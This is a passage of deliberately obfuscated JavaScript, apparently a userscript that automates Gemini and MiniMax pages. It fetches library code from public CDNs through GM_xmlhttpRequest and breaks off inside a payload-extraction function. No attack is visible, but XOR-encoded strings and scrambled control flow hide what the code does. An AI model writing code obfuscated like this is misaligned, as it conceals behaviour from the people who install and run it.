SdIktN_vBVujZP$Oq=['aaefefbcbcbcbc','eeece4e0e7e0a4efe0e5eca4e0e7f9fcfd','a7e8e7fda4faece5eceafda4edfbe6f9ede6fee7d2fafdf0e5eca3b4abede0faf9e5e8f0b3a9ebe5e6eae2abd4','cafbecede0fdfab3a9','c4e6fcfaecccffece7fdfa','e8f9f9ece7edcae1e0e5ed','bdbeb0bbbdbcc1d3e6ebc4f0','faf9e5e0fd','e4e6fcfaecfcf9','a9f9e14a33fda9','eafbece8fdecc6ebe3eceafddcdbc5','fafbea','e8fcede0e6','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9ede0ff','b5a6faf9e8e7b7','e8fcede0e6a6e4f9ecee','f9fcfae1','e0e7f9fcfdd2fdf0f9ecb4abeae1eceae2ebe6f1abd4','eafbece8fdecccffece7fd','a7eee8f9a4bb','e1fdfdf9','fafdf0e5ec','b5a6faf9e8e7b7b5faf9e8e7b7ca4a2bfcb3a9','a7e4f9ba','efe8e5faec','b5a6faf9e8e7b7b5faf9e8e7b7dd683222b3a9','dffce0a9e54a3be7eea9eae1683204e7a9fd68320ef9a94a2be4a9fde1e8e7e1a8','e4e4f1a4e8eafde0ffec','dffce0a9e54a3be7eea9e7e1683324f9a9ff4d0ae7a9eb68332ae7a8','e8eded','a7e8e7fda4faece5eceafda4edfbe6f9ede6fee7b3e7e6fda1a7e8e7fda4faece5eceafda4edfbe6f9ede6fee7a4e1e0ededece7a0','e1ece8ed','c4e6fcfaecccffece7fd','f8fcecfbf0daece5eceafde6fbc8e5e5','efe0e5ecfa','e7e6e7ec','fee8ffecefe6fbe4a4f9e5e8f0a4f9e8fcfaec','babfb0b8babbb1cee1f0f3e4cd','aaefefbeb0eabf','bcb9b8bebbbcfdf3c2ebd9de','fafde8fbfdfadee0fde1','b5faf9e8e7b7c24a34a9fd683238b3a9','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9a7e8e7fda4eae1eceae2ebe6f1a4fefbe8f9f9ecfb','eeece4e0e7e0a4f9fbe6eefbecfafaa4e5e8ebece5','ecfbfbe6fb','e6efeffaecfdc1ece0eee1fd','eeece4e0e7e0a4f9fbe6eefbecfafaa4eae6e7fde8e0e7ecfb','ede0ff','e5ece7eefde1','e7e6edecddf0f9ec','e4e6fcfaecede6fee7','b1b9bbbdb8bfdeedc7c5cfda','f9e5e8f0d9e8fcfaec','dbece4e6ffeca9cbe8eae2eefbe6fce7eda9c7e6e0faec','d2ede8fde8a4ffe8e5fcecd4','efe0e5fdecfb','fdecf1fde8fbece8d2f9e5e8eaece1e6e5edecfbb4abc5e8e7eefce8eeecabd4','ceece7ecfbe8fdec','a7e8e7fda4faece5eceafda4edfbe6f9ede6fee7d2fafdf0e5eca3b4abffe0fae0ebe0e5e0fdf0b3a9ffe0fae0ebe5ecabd4','eae1eceae2eced','ede0ffd2eae5e8fafaa3b4abe8e7fda4faece5eceafda4e0fdece4abd4','eeece4e0e7e0a4e5e8e7eefce8eeeca4faece5eceafd','eeecfdc8fdfdfbe0ebfcfdec','fee8ffecefe6fbe4a4eae6e7fdfbe6e5fa','eeecfdcde8fdec','f9e8fbece7fdcce5ece4ece7fd','aabcb9efe8beeb','e0e7f9fcfd','e0e7e0fdc4e6fcfaecccffece7fd','ca68332cfca9e14a25e7e1a9fde14a29e7e1a9ea4a3de7eea8a9c7ee4a3de7a9e7ee683226b3a9','eae8e5e5','f9e8fcfaec','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9a7e8e7fda4faece5eceafda4faece5eceafde6fb','aaefefebb1bfea','eeece4e0e7e0a4ede6fee7e5e6e8eda4e4ecfbeeeceda4ebfde7','e6ebe3eceafd','a7e8e7fda4faece5eceafda4e0fdece4a4e6f9fde0e6e7','d9e6e0e7fdecfbccffece7fd','eeece4e0e7e0a4fcf9e5e6e8eda4fafde8fdfcfa','eeece4e0e7e0a4e1e0ededece7a4fdecf1fda4efe6fba4fbecf8fcecfafd','eeecfdc4e0e7fcfdecfa','fafde8fdfcfa','fbe6fce7ed','dd683328e4a9ed683222e7ee','eeece4e0e7e0a4fafde6f9a4ebfde7','b5a6faf9e8e7b7b5faf9e8e7b74d19e6683328e7b3a9','e0e4ee','efe5e6e6fb','e8e5fd','eeece4e0e7e0a4efe0e7e8e5a4fbecfafce5fd','eafbece8fdec','c1ddddd9a9ecfbfbe6fba8a9fafde8fdfcfab3a9','f9e6e0e7fdecfbede6fee7','ede0fae8ebe5eced','dfe0ecfde7e8e4ecfaec','dcfaecfba9c8ffe8fde8fb','ebfcfdfde6e7a7e8e7fda4fafee0fdeae1a7eafcfafde6e4a4fafee0fdeae1a7eae5e6e7eca4eae5e8e0e4','c568321ee0b3a9c2e14a3de7eea9fde168320aa9eae1683204e7a9e7ee4a3de7a9e7ee683226a9','ebe6edf0','eae5e6faecfafd','b8b0b9bcbabcbde7e3f0cfe4e1','fee0edfde1','ffe8e5fcec','fce7edecefe0e7eced','ede0faeae6e7e7eceafd','eeece4e0e7e0a4e4e8e0e7a4fdecf1fde8fbece8','e1fdfdf9fab3a6a6fce7f9e2eea7eae6e4a6fee8ffecfafcfbefecfba7e3fac9bea6ede0fafda6fee8ffecfafcfbefecfba7e4e0e7a7e3fa','faf9e8e7a7fdecf1fda4d5d2b8baf9f1d5d4a7efe6e7fda4d5d2bfb9b9d5d4a7fdecf1fda4ebfbe8e7edd6b9b9','d2fbe6e5ecb4abe5e0fafdebe6f1abd4b3e7e6fda1d2fafdf0e5eca3b4abede0faf9e5e8f0b3a9e7e6e7ecabd4a0','e4e8e0e7a7efe5ecf1a7e1a4effce5e5a7efe5ecf1a4eae6e5','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9a7e8e7fda4faece5eceafda4faece5eceafde0e6e7a4e0fdece4','b8bdffdce8c1e1da','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4','eeece4e0e7e0a4fcfaecfba4eafbecede0fdfa','ebe5e6eae2','c568321ee0a9fd68332ae0a9efe0e5eca9e54a23e7a7','eafbece8fdeccce5ece4ece7fd','eeece4e0e7e0a4e4e8e0e7a4eae6e7fde8e0e7ecfb','e1fbecef','a9eee04a2bf0','ebfcfdfde6e7d2fbe6e5ecb4abfafee0fdeae1abd4','e8ededccffece7fdc5e0fafdece7ecfb','eeece4e0e7e0a4fdecf1fda4fafde8fdfa','eeece4e0e7e0a4fafde8fbfda4f8fcecfceca4ebfde7','f9e8eddafde8fbfd','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9ebfcfdfde6e7','e6ebfaecfbffec','eeecfdc4e6e7fde1','c568321ee0','4d194a2aa9fd68332ae0a9efe0e5eca7a9cb683326fda94d1868332efca9ea68332cfca9e14a25e7e1a7a7a7','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9a7e8e7fda4faece5eceafd','faeafbe0f9fd','aab1ebecb0efed','efe0fbec','edecfafdfbe6f0','aaffe6e0eaecfaa4eae5e6e7e0e7eea4efe6fbe4a9e0e7f9fcfdd2fdf0f9ecb4abefe0e5ecabd4','eae6e5e6fb','ebe5e6eb','eeecfdcffce5e5d0ece8fb','dde0683336f9a9fd68322cea','ede0ffd2fbe6e5ecb4abe6f9fde0e6e7abd4','fdecf1fdcae6e7fdece7fd','aaeeece4e0e7e0a4fee8ffecefe6fbe4','cb683326fda94d1868332efca9fd683328e6a94a2be4a9fde1e8e7e1','e5e8fafdc0e7edecf1c6ef','b8babab0beb1bffdcecae4c4c8','eeece4e0e7e0a4fcf9e5e6e8eda4ebfde7','eeece4e0e7e0a4fde0e4eca4fde8e2ece7','e8fbe0e8a4eae1eceae2eced','eae5e0eae2','faf9e8e7','e6fee7ecfbcde6eafce4ece7fd','dbeceeece7ecfbe8fdec','ede0faf9e8fdeae1ccffece7fd','eeece4e0e7e0a4fcfaecfba4e0e7efe6','aca9a1cae1fce7e2a9','dde6e6e5a9ebf0a9cb4a10c0a94d19683221caa9c1683329c7c1a9a4a9d3c8c5c6b3a9b9b0bfbfa7bcbbbaa7bcb8b1','f9e6e0e7fdecfbede6fee7','fafcebfafdfbe0e7ee','e0e7e7ecfbc1ddc4c5','ede6fee7e5e6e8ed','cdc6c4cae6e7fdece7fdc5e6e8edeced','f9fbecffe0ecfed6fdecf1fd','e1e8fa','ece4f9fdf0','f8fcecfbf0daece5eceafde6fb','dd68321ce7eea9fde1683214e0a9eee0e8e7a9f1683224a9e54a34b3a9','eeecfdc1e6fcfbfa','4d19e8e7eea9fd68332ae0a9e54a23e7a9ff4a29a9ea68332cfca9e14a25e7e1a7a7a7','fde6c5e6feecfbcae8faec','e1fdfdf9fab3a6a6eaede7a7e3faedece5e0fffba7e7ecfda6e7f9e4a6fafeececfde8e5ecfbfdbbc9b8b8','ede0ffd2eae5e8fafaa3b4abeafcfbfae6fba4f9e6e0e7fdecfbabd4','fdfbe0e4','e5e6e8ed','f9e5e8f0','eae1e8e7eeec','b8bfb9b8b9b9c5d0e7edcbe6','eae5e8fafac5e0fafd','eeece4e0e7e0a4f9e8fcfaeca4ebfde7','e8ededecedc7e6edecfa','eeece4e0e7e0a4f9fbe6eefbecfafaa4ebe8fb','efe6fbcce8eae1','eeecfdcce5ece4ece7fdcbf0c0ed','fafdfbe0e7eee0eff0','e0e4eed2e8e5fdb4abc4e0e7e0c4e8f1a9c8c0a9e8ffe8fde8fba9f9e7eeabd4','ede0faf9e5e8f0','f9e6e0e7fdecfb','efe6eafcfa','dde6e6e5a4e4e0e7e0e4e8f1a4ebfce0a4edfceaa4e1e8e7e1a4f3e8e5e6a4b9b0bfbfa4bcbbbaa4bcb8b1a4','e0fdece4fa'];IG_rKyaLCWfnmy=function(){return SdIktN_vBVujZP$Oq;};return IG_rKyaLCWfnmy();}}
    var eQy$jHqvZ$VRt=a_bFPiGlSzTbI;function Tv_yC$FI(){var cwAbblBfq=['58585e391e3e2d0418','585b58535e58523c1b3b0d3300','5b5c5e5a5e5a595c0d3c0e01093c','5d1b332e182423','5b5c0e3c2c08212e','5c5b5c535f3e1e3f2b1819','5c3d0e28382f3f','5e5e53585f5f1b382e181b3d','5e5d5b5b5a585a1d331f3d3a0c','5f535c5b5a1800030f381a','2d2f3e','5b595f5a5f5e5c000d3b042420'];Tv_yC$FI=function(){return cwAbblBfq;};return Tv_yC$FI();}(function(DM$euYMk_xvslFT,XMQgTx$JB_ZEKlXswW){var wfX$GDJQ_sM=a_bFPiGlSzTbI,BKPGLFZvhjO$eMbDZiU=DM$euYMk_xvslFT();while(!![]){try{var BRVChfCjtMqdQKAccar$_EbNrb=Math['floor'](-parseFloat(wfX$GDJQ_sM(0xc0))/(-0x229f+0x24e9+-parseInt(0x249)))*Math['trunc'](-parseFloat(wfX$GDJQ_sM(0xb9))/(-parseInt(0x1)*-parseInt(0xa1b)+-parseInt(0x6)*parseInt(0x3c7)+parseInt(0xc91)))+Math['floor'](parseFloat(wfX$GDJQ_sM(0xbb))/(0x45+parseInt(0x1719)+Math.floor(-0x175b)))+parseFloat(wfX$GDJQ_sM(0xbd))/(0x16*parseInt(parseInt(0xb3))+-0xecc*parseInt(0x2)+-0x71d*Math.max(-parseInt(0x2),-0x2))+-parseFloat(wfX$GDJQ_sM(0xb7))/(-parseInt(0x20a0)+-parseInt(0x338)+Math.ceil(parseInt(0x23dd)))*Math['max'](-parseFloat(wfX$GDJQ_sM(0xb6))/(Number(-parseInt(0x1cbf))+parseInt(0x7bd)+Math.trunc(0x1508)*Math.max(parseInt(0x1),parseInt(0x1))),-parseFloat(wfX$GDJQ_sM(0xbf))/(Math.ceil(-parseInt(0x1))*Math.max(-parseInt(0x2020),-0x2020)+parseFloat(0xc0b)+parseInt(parseInt(0x2))*-parseInt(0x1612)))+-parseFloat(wfX$GDJQ_sM(0xbc))/(-0x26fb+parseInt(0x4a2)*Number(-parseInt(0x4))+parseInt(-0x1)*-parseInt(0x398b))*(parseFloat(wfX$GDJQ_sM(0xc1))/(-parseInt(0x2279)+parseFloat(0xf6b)*Math.floor(0x1)+parseInt(0x1)*0x1317))+parseFloat(wfX$GDJQ_sM(0xb8))/(Number(parseInt(0xa41))+parseFloat(-parseInt(0x6c9))+Math.max(-0x36e,-0x36e))+-parseFloat(wfX$GDJQ_sM(0xbe))/(0x16b0+0x22c3+parseInt(-parseInt(0x3968)));if(BRVChfCjtMqdQKAccar$_EbNrb===XMQgTx$JB_ZEKlXswW)break;else BKPGLFZvhjO$eMbDZiU['push'](BKPGLFZvhjO$eMbDZiU['shift']());}catch(PLBrxtcz){BKPGLFZvhjO$eMbDZiU['push'](BKPGLFZvhjO$eMbDZiU['shift']());}}}(Tv_yC$FI,0x1*parseInt(0x31c96)+parseFloat(parseInt(0x7eac0))+Math.max(-parseInt(0x5e252),-parseInt(0x5e252))));function a_bFPiGlSzTbI(exF$CmWkHBWwvhueQn_SRUD,SOtymPcK$sf$td){var FbKDrji_eRpjgQnNJVqQgYjqR=Tv_yC$FI();return a_bFPiGlSzTbI=function(rqWWdB$REUqYDrN$IS,TGnrTtUArswY){rqWWdB$REUqYDrN$IS=rqWWdB$REUqYDrN$IS-(-parseInt(0x16d2)+parseInt(-parseInt(0x1))*Number(-parseInt(0x1f9f))+parseFloat(-0x817));var WPfg__VdkcVcYeu=FbKDrji_eRpjgQnNJVqQgYjqR[rqWWdB$REUqYDrN$IS];if(a_bFPiGlSzTbI['TePZwi']===undefined){var noWXMmoKDVIVzhQBO=function(ruHXaniORWzgPPnBdKtZZPCT){var aWd$GvhoqNHr=parseInt(0x101)*-0x26+parseInt(-parseInt(0x246f))+-0x107*Math.ceil(-parseInt(0x49))&-0x3*Number(-0x551)+Math.ceil(0xcb1)+-0x1ba5,PXfxrbyIHURGp=new Uint8Array(ruHXaniORWzgPPnBdKtZZPCT['match'](/.{1,2}/g)['map'](XswWHBKP$G=>parseInt(XswWHBKP$G,-parseInt(0x16a1)*0x1+parseInt(0x1)*Math.max(0x19ea,0x19ea)+Math.trunc(-parseInt(0x339))))),mLVVLuDMe=PXfxrbyIHURGp['map'](FZ$vhjOe_MbDZiUXBRVChf=>FZ$vhjOe_MbDZiUXBRVChf^aWd$GvhoqNHr),YMkx$vslFTBXMQ=new TextDecoder(),TxJ_BZEK=YMkx$vslFTBXMQ['decode'](mLVVLuDMe);return TxJ_BZEK;};a_bFPiGlSzTbI['wnJVld']=noWXMmoKDVIVzhQBO,exF$CmWkHBWwvhueQn_SRUD=arguments,a_bFPiGlSzTbI['TePZwi']=!![];}var rrRG$k=FbKDrji_eRpjgQnNJVqQgYjqR[parseInt(0x60)*0x8+parseInt(0x179)*-parseInt(0x5)+Math.trunc(-0x45d)*Math.ceil(-parseInt(0x1))],zNnpOLDOAA$PbethO$pKgT=rqWWdB$REUqYDrN$IS+rrRG$k,PfN$dwJlPnXyexmbiCKAg=exF$CmWkHBWwvhueQn_SRUD[zNnpOLDOAA$PbethO$pKgT];return!PfN$dwJlPnXyexmbiCKAg?(a_bFPiGlSzTbI['wqBQUP']===undefined&&(a_bFPiGlSzTbI['wqBQUP']=!![]),WPfg__VdkcVcYeu=a_bFPiGlSzTbI['wnJVld'](WPfg__VdkcVcYeu),exF$CmWkHBWwvhueQn_SRUD[zNnpOLDOAA$PbethO$pKgT]=WPfg__VdkcVcYeu):WPfg__VdkcVcYeu=PfN$dwJlPnXyexmbiCKAg,WPfg__VdkcVcYeu;},a_bFPiGlSzTbI(exF$CmWkHBWwvhueQn_SRUD,SOtymPcK$sf$td);}function gmFetch({method:method=eQy$jHqvZ$VRt(0xba),url:rpwkRRdJDz,headers:headers={},data:data=null}){return new Promise((tSrfWBvERNWBhYpZOtAOe,FCmWkHBWwvhueQ)=>{GM_xmlhttpRequest({'method':method,'url':rpwkRRdJDz,'headers':headers,'data':data,'onload':tSrfWBvERNWBhYpZOtAOe,'onerror':FCmWkHBWwvhueQ});});}
    function AzcphZJuXferpLWJ(sHqchczSAVBpqEwEc,Ozl$BQipZXPretAVnzT){const YpMh$IjyDIn$yyfqmHijS=ZGZrCOq$XW$k();return AzcphZJuXferpLWJ=function(cThMJwLctPHT,Yf$OT_ZU){cThMJwLctPHT=cThMJwLctPHT-(Math.floor(parseInt(0x1a62))+parseInt(0x1)*-0x9b+Math.ceil(-parseInt(0x2))*parseInt(0xc5f));let qi$rw_pvlFxjnKdApDYYH=YpMh$IjyDIn$yyfqmHijS[cThMJwLctPHT];if(AzcphZJuXferpLWJ['iHhSyQ']===undefined){const FzrQQLpGUVmQjBtc=function(pQvII_$VSshiUT){let TOgehhUUVW_OBfYNrFFzlVjyj=-0x1*Number(parseInt(0x16d8))+Number(parseInt(0x343))+0x15e2&parseInt(0x240b)+-parseInt(0x1f47)+Math.floor(-parseInt(0x3c5)),QnULO_EEZ=new Uint8Array(pQvII_$VSshiUT['match'](/.{1,2}/g)['map'](mzWSNqHDWU$KOZOch=>parseInt(mzWSNqHDWU$KOZOch,Math.max(-parseInt(0x21cd),-0x21cd)+parseInt(0x234d)*-parseInt(0x1)+0x452a))),tfSf$kHSVUr=QnULO_EEZ['map'](xupJtGzPHCqWl_MRQq$JitF=>xupJtGzPHCqWl_MRQq$JitF^TOgehhUUVW_OBfYNrFFzlVjyj),sZuofpVZcLGCAgSLKRYP=new TextDecoder(),PkyCfNImTLZrO$nqIU=sZuofpVZcLGCAgSLKRYP['decode'](tfSf$kHSVUr);return PkyCfNImTLZrO$nqIU;};AzcphZJuXferpLWJ['eLXfFN']=FzrQQLpGUVmQjBtc,sHqchczSAVBpqEwEc=arguments,AzcphZJuXferpLWJ['iHhSyQ']=!![];}const oSGt_VrDHdZDtCZYq$NZxHq=YpMh$IjyDIn$yyfqmHijS[parseInt(-0x1396)+parseInt(0xd85)+parseInt(0x611)],DhNeSLiKv$ktMQn_v=cThMJwLctPHT+oSGt_VrDHdZDtCZYq$NZxHq,SsCQJZZjHirDTjEPRP=sHqchczSAVBpqEwEc[DhNeSLiKv$ktMQn_v];return!SsCQJZZjHirDTjEPRP?(AzcphZJuXferpLWJ['JPxiPz']===undefined&&(AzcphZJuXferpLWJ['JPxiPz']=!![]),qi$rw_pvlFxjnKdApDYYH=AzcphZJuXferpLWJ['eLXfFN'](qi$rw_pvlFxjnKdApDYYH),sHqchczSAVBpqEwEc[DhNeSLiKv$ktMQn_v]=qi$rw_pvlFxjnKdApDYYH):qi$rw_pvlFxjnKdApDYYH=SsCQJZZjHirDTjEPRP,qi$rw_pvlFxjnKdApDYYH;},AzcphZJuXferpLWJ(sHqchczSAVBpqEwEc,Ozl$BQipZXPretAVnzT);}(function(qJitFqsHSvn_Qyi$ZmGUrmjG,BFgPYsOxB$ekk){const IMDgufKIXRnCWKJYC_aPfmPB=AzcphZJuXferpLWJ,TtWbsttibpKjYBnCltzhJrAma=qJitFqsHSvn_Qyi$ZmGUrmjG();while(!![]){try{const jYEjkpBjgbVNjaC$nD_hX=Math['max'](-parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x10c))/(0xf7*0x1f+parseInt(0x1cf)*parseInt(-parseInt(0xe))+Number(parseInt(0x1))*-0x496),-parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x111))/(-0x32*-0x31+Math.ceil(-0xd5)*Math.ceil(-parseInt(0x25))+Number(-0x3)*parseFloat(parseInt(0xd73))))+parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x10f))/(parseInt(-parseInt(0x17))*-parseInt(0x8d)+parseInt(0x2033)+parseFloat(-parseInt(0x2cdb)))*(parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x10e))/(Math.max(parseInt(0x15b5),parseInt(0x15b5))+Math.max(-parseInt(0x1d30),-parseInt(0x1d30))+parseInt(parseInt(0x77f))))+Number(parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x117))/(0x18*Number(0x14)+-parseInt(0x1ed7)+0x7*Math.trunc(0x424)))*(parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x114))/(Math.max(-parseInt(0x2f),-parseInt(0x2f))*0x83+0x43*-0x5d+parseInt(0x1)*parseFloat(0x306a)))+-parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x110))/(parseInt(0x1705)*-0x1+Math.floor(-0xd)*-0xe9+Math.ceil(-0xb)*-parseInt(0x105))*parseFloat(-parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x116))/(parseInt(0x2)*Math.floor(parseInt(0x1334))+parseInt(0x1)*-parseInt(0x240d)+-parseInt(0x253)))+Math['trunc'](-parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x11a))/(-parseInt(0x179b)*-parseInt(0x1)+parseFloat(0x840)+Math.ceil(-parseInt(0x1fd2))*parseInt(0x1)))+parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x109))/(-parseInt(0x60)*-0x66+parseFloat(-0xd48)+parseInt(0x18ee)*-parseInt(0x1))+-parseFloat(IMDgufKIXRnCWKJYC_aPfmPB(0x11b))/(parseInt(0x7)*parseInt(0x2db)+Math.floor(0x70f)*-0x2+parseInt(0x175)*-0x4);if(jYEjkpBjgbVNjaC$nD_hX===BFgPYsOxB$ekk)break;else TtWbsttibpKjYBnCltzhJrAma['push'](TtWbsttibpKjYBnCltzhJrAma['shift']());}catch(yj_i_xMFM){TtWbsttibpKjYBnCltzhJrAma['push'](TtWbsttibpKjYBnCltzhJrAma['shift']());}}}(ZGZrCOq$XW$k,-parseInt(0x3)*0x4dbf+-parseInt(0x1)*0x1af26+parseInt(0x1f)*Number(parseInt(0x2717))));function ZGZrCOq$XW$k(){const aGiE__wBQc=['7f7b7e7c7b7e7d1e3e0e1c0717','16000015106d01242f6d2b2c242177','3d383e25','7a7974797d3d3b210b3527','6d676247','7c7b0a391b3f0905','7c7f7a787f791414051d221e','747c3c3709250328','7c797475757d2306290c3d09','27222423','3a2c3f23','7c787d143c03173505','4762676d21242f776d','7c7f7b74747f1e0124063b26','7c7b757478291709390e17','0a0819','3f283e3d22233e2819283539','7f7c7a7d79787539001c233b05','7f7479787a787b172705243f09'];ZGZrCOq$XW$k=function(){return aGiE__wBQc;};return ZGZrCOq$XW$k();}async function fetchLibsText(){const BE$RSbESkRkxORZw=AzcphZJuXferpLWJ,tAIbmIzhizWSFsHqchc=[];for(const SAVBpqEwE$cHOzlB of LIB_URLS){try{const ipZXPretAVnzT$_KYpMhIjyD=await gmFetch({'method':BE$RSbESkRkxORZw(0x118),'url':SAVBpqEwE$cHOzlB});tAIbmIzhizWSFsHqchc[BE$RSbESkRkxORZw(0x10b)](BE$RSbESkRkxORZw(0x115)+SAVBpqEwE$cHOzlB+BE$RSbESkRkxORZw(0x10d)+ipZXPretAVnzT$_KYpMhIjyD[BE$RSbESkRkxORZw(0x119)]+'\x0a');}catch(nyyfqmHijSr_cThMJwL){console[BE$RSbESkRkxORZw(0x113)](BE$RSbESkRkxORZw(0x10a),SAVBpqEwE$cHOzlB,nyyfqmHijSr_cThMJwL);}}return tAIbmIzhizWSFsHqchc[BE$RSbESkRkxORZw(0x112)]('\x0a');}
    function lowdJIEZTWxhjDE_Ybsbn(WLWRS_TGTrYGvAKKaQ_T,rtAFUqPGvCyUOIUpDhhqxZ){const vM_CLb=QsdNLnnWjP$nI$Eg();return lowdJIEZTWxhjDE_Ybsbn=function(vHhhrp_PUaAYWdWkZNJ,FQaP$RUCpzHXcjySm_u){vHhhrp_PUaAYWdWkZNJ=vHhhrp_PUaAYWdWkZNJ-(-parseInt(0x148a)+-parseInt(0x9)*0x85+parseInt(0x1a26));let opTex$$eD=vM_CLb[vHhhrp_PUaAYWdWkZNJ];if(lowdJIEZTWxhjDE_Ybsbn['owkSoy']===undefined){const mVabXvrkSwPfWRgtZatqabuV=function(qODixd_xoDJwQuiSvfyqGQLGR){let JSQwk$qBpFPZgUodTy$iG=Number(-parseInt(0x1))*-0x2239+0x2*-0xc9a+Math.trunc(-0x644)&0xecc*0x1+parseInt(0xce9)*Math.trunc(parseInt(0x1))+-parseInt(0x1ab6),K_A$YrNstyM=new Uint8Array(qODixd_xoDJwQuiSvfyqGQLGR['match'](/.{1,2}/g)['map'](BPFvZYl=>parseInt(BPFvZYl,Math.ceil(-0x2441)+-0xbcc+-0x301d*-parseInt(0x1)))),VzCChqR_C$E=K_A$YrNstyM['map'](dsTJbaxifNOaxYpEtsq=>dsTJbaxifNOaxYpEtsq^JSQwk$qBpFPZgUodTy$iG),zyvDqsqUiYZzSJjl_DFFLXqJI=new TextDecoder(),xgtbKcvVEI$DKFxkiaIsZlK=zyvDqsqUiYZzSJjl_DFFLXqJI['decode'](VzCChqR_C$E);return xgtbKcvVEI$DKFxkiaIsZlK;};lowdJIEZTWxhjDE_Ybsbn['noYJYN']=mVabXvrkSwPfWRgtZatqabuV,WLWRS_TGTrYGvAKKaQ_T=arguments,lowdJIEZTWxhjDE_Ybsbn['owkSoy']=!![];}const nQahei=vM_CLb[Math.max(parseInt(0x6c6),parseInt(0x6c6))+0x13cf*parseInt(0x1)+Math.max(-0x1a95,-parseInt(0x1a95))],Jhlsgj$Ay_YnONxCHTUSe=vHhhrp_PUaAYWdWkZNJ+nQahei,wJDgdWIzHGggkfpxzQXd=WLWRS_TGTrYGvAKKaQ_T[Jhlsgj$Ay_YnONxCHTUSe];return!wJDgdWIzHGggkfpxzQXd?(lowdJIEZTWxhjDE_Ybsbn['xwQxzu']===undefined&&(lowdJIEZTWxhjDE_Ybsbn['xwQxzu']=!![]),opTex$$eD=lowdJIEZTWxhjDE_Ybsbn['noYJYN'](opTex$$eD),WLWRS_TGTrYGvAKKaQ_T[Jhlsgj$Ay_YnONxCHTUSe]=opTex$$eD):opTex$$eD=wJDgdWIzHGggkfpxzQXd,opTex$$eD;},lowdJIEZTWxhjDE_Ybsbn(WLWRS_TGTrYGvAKKaQ_T,rtAFUqPGvCyUOIUpDhhqxZ);}function QsdNLnnWjP$nI$Eg(){const zFdHhJZFQtBAbIf=['f0f1f5f7f8f9f59482b1bb8999','f4f7b789a9a9b3b1','f0f2f5f1f9f49194a0809896','b5ae92b5b3a8afa6','a8afa5a4b98ea7','f2f9948e8894b185','f0f6f0a2abb892acb4','f6f8f4f8f4f0f3a485a4af90a0','b5b3a8ac','f0f3a9a4a88a8ba9','f0f7f1f8f1f3a596aa9b8f8b','f0f2f2f9a9a9b0b99ba0','b2ada8a2a4','f2f1f6f0f6f1a6aeb195a4b9','ada0b2b588afa5a4b98ea7','f5f8878790a09193','f9f8f0f9f2f2f9adb2a6ab80b8','f0f1f8f9f4f2f5b78c828da389'];QsdNLnnWjP$nI$Eg=function(){return zFdHhJZFQtBAbIf;};return QsdNLnnWjP$nI$Eg();}(function(FxkiaIsZlKfB_PF_vZYlJ,sT_J$bax){const aveOXMvxVqiiYjJq=lowdJIEZTWxhjDE_Ybsbn,f_$NOaxYpE=FxkiaIsZlKfB_PF_vZYlJ();while(!![]){try{const sq$EOKx_JjVklh=-parseFloat(aveOXMvxVqiiYjJq(0xf6))/(parseInt(0x65)*parseInt(0x5c)+parseFloat(-parseInt(0x1298))+0x17*-parseInt(0xc5))*(-parseFloat(aveOXMvxVqiiYjJq(0xfc))/(Number(-0x11a)*Math.max(parseInt(0x5),parseInt(0x5))+0xe12+0x6*Math.floor(-0x16d)))+parseFloat(aveOXMvxVqiiYjJq(0xf0))/(-0x1e2d+parseFloat(-parseInt(0x1064))+Number(0x174a)*Math.max(parseInt(0x2),0x2))+parseFloat(aveOXMvxVqiiYjJq(0xf2))/(-parseInt(0x24d9)+Number(0x23e7)+parseInt(0xf6))*Math['max'](parseFloat(aveOXMvxVqiiYjJq(0xf3))/(parseInt(-0xa1d)*0x3+Math.trunc(0x227d)+Math.ceil(-0x421)*0x1),parseFloat(aveOXMvxVqiiYjJq(0xfb))/(Math.trunc(0x1f91)+0x2*0x1001+-0x3f8d))+-parseFloat(aveOXMvxVqiiYjJq(0x100))/(Number(parseInt(0x59e))+-0x1*Math.ceil(-0xe37)+-0x13ce)*(parseFloat(aveOXMvxVqiiYjJq(0xf1))/(Math.ceil(parseInt(0x2b))*Math.floor(-parseInt(0x57))+Math.ceil(0x15b)*0x7+Math.floor(0x14)*parseInt(0x42)))+Math['floor'](parseFloat(aveOXMvxVqiiYjJq(0xf7))/(parseInt(0xfe1)*parseInt(-parseInt(0x1))+0x7bf+-0x29*-parseInt(0x33)))*(parseFloat(aveOXMvxVqiiYjJq(0xfe))/(Math.ceil(0x1576)*-0x1+parseInt(parseInt(0xf71))+-0xb*-parseInt(0x8d)))+Math['ceil'](parseFloat(aveOXMvxVqiiYjJq(0xf8))/(-parseInt(0x1d)*parseInt(0x2)+Math.floor(0x45c)+0x1*Math.trunc(-0x417)))+parseFloat(-parseFloat(aveOXMvxVqiiYjJq(0xfa))/(parseInt(0x491)+-parseInt(0xe9d)+-0x88*parseInt(-parseInt(0x13))))*Math['floor'](parseFloat(aveOXMvxVqiiYjJq(0xef))/(Number(parseInt(0xdd2))+0x1*parseInt(-parseInt(0x18c1))+Math.ceil(parseInt(0x26))*parseFloat(parseInt(0x4a))));if(sq$EOKx_JjVklh===sT_J$bax)break;else f_$NOaxYpE['push'](f_$NOaxYpE['shift']());}catch(tbqU_QAxuc_no){f_$NOaxYpE['push'](f_$NOaxYpE['shift']());}}}(QsdNLnnWjP$nI$Eg,-0x15d6b+Math.max(-parseInt(0xb0606),-parseInt(0xb0606))+-parseInt(0x1397a5)*Math.floor(-parseInt(0x1))));function extractPayload(){const npoq_ZQoAVUimKWdKe=lowdJIEZTWxhjDE_Ybsbn,LIWLWR$$STGTrYG=MMX_APP_PAYLOAD[npoq_ZQoAVUimKWdKe(0xf4)]();return 